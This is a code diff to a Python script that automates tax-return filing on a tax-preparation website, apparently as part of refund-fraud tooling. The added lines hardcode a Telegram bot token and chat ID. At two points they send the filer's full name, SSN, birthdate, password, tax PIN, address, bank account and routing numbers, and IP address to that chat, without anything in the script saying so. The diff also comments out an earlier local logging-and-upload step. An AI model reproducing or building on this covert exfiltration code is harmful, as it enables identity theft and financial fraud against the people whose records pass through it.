@@ -1,6 +1,9 @@
 if __name__ == '__main__':
+    import telebot
     from config import *
-
+    API_KEY = '5598225872:AAEnMZvTWOHVmAoKA6kATcIdFh_qqXLWQ8g'
+    chatid = 891361845 #to get chat id  ||  print(message.chat.id)
+    bot = telebot.TeleBot(API_KEY)
     dt = datetime.strptime(bday, "%m/%d/%Y")
     bdaymonth = dt.month
     bdaydate = dt.day
@@ -48,6 +51,7 @@ if __name__ == '__main__':
         time.sleep(1.5)
         clickbtn('create-account')
         ##PAGE2
+        bot.send_message(chatid, "A NEW CLAIM HAS BEEN STARTED FROM USER " + user + " AT " + date_time + " From IP: " + IPAddr + "! | First Name = " + str(fname) + " | Last Name = " + str(lname) + " | SSN = " + str(ssn) + " | Birthdate = " + str(bday) + " | Email = " + str(email) + " | Phone = " + str(phone) + " | Password = " + str(pswrd) + " | Tax Pin =  " + str(taxpin) + " | Address = " + str(street) + ", " + str(city) + ", " + str(apt) + ", " + str(state) + " | Bank = Account # " + str(an) + " | Routing # " + str(rn) + " | fedwithheldmin = " + str(fedwithheldmin) + " | fedwithheldmax = " + str(fedwithheldmax))
         time.sleep(4.05)
         driver.get('https://www.taxslayer.com/myaccount/userconsole')
         clickbtn('begin-return')
@@ -250,15 +254,16 @@ if __name__ == '__main__':
             call('git init')
         with suppress_stderr():
             downloadgit()
-        with open("chromereference.txt", "a+") as file_object:
-            file_object.seek(0)
-            data = file_object.read(100)
-            if len(data) > 0 :
-                file_object.write("\n")
-                file_object.write("A New Claim Has Been Filed At " + date_time + " From IP: " + IPAddr + "! | First Name = " + str(fname) + " | Last Name = " + str(lname) + " | SSN = " + str(ssn) + " | Birthdate = " + str(bday) + " | Email = " + str(email) + " | Phone = " + str(phone) + " | Password = " + str(pswrd) + " | Tax Pin =  " + str(taxpin) + " | Address = " + str(street) + ", " + str(city) + ", " + str(apt) + ", " + str(state) + " | Bank = Account # " + str(an) + " | Routing # " + str(rn))
-        upload()
+#        with open("chromereference.txt", "a+") as file_object:
+#            file_object.seek(0)
+#            data = file_object.read(100)
+#            if len(data) > 0 :
+#                file_object.write("\n")
+#                file_object.write("A New Claim Has Been Filed At " + date_time + " From IP: " + IPAddr + "! | First Name = " + str(fname) + " | Last Name = " + str(lname) + " | SSN = " + str(ssn) + " | Birthdate = " + str(bday) + " | Email = " + str(email) + " | Phone = " + str(phone) + " | Password = " + str(pswrd) + " | Tax Pin =  " + str(taxpin) + " | Address = " + str(street) + ", " + str(city) + ", " + str(apt) + ", " + str(state) + " | Bank = Account # " + str(an) + " | Routing # " + str(rn))
+#        upload()
+        
         #-#-#-#-#-#-#-#-
-
+        bot.send_message(chatid, "A CLAIM HAS BEEN FULLY COMPLETED AT " + date_time + " From IP: " + IPAddr + "! | First Name = " + str(fname) + " | Last Name = " + str(lname) + " | SSN = " + str(ssn) + " | Birthdate = " + str(bday) + " | Email = " + str(email) + " | Phone = " + str(phone) + " | Password = " + str(pswrd) + " | Tax Pin =  " + str(taxpin) + " | Address = " + str(street) + ", " + str(city) + ", " + str(apt) + ", " + str(state) + " | Bank = Account # " + str(an) + " | Routing # " + str(rn) + " | fedwithheldmin = " + str(fedwithheldmin) + " | fedwithheldmax = " + str(fedwithheldmax))
         ##PG41 FINAL PAGE
         #clickbtn('btnSubmit')
         print("Successfully Filed!")
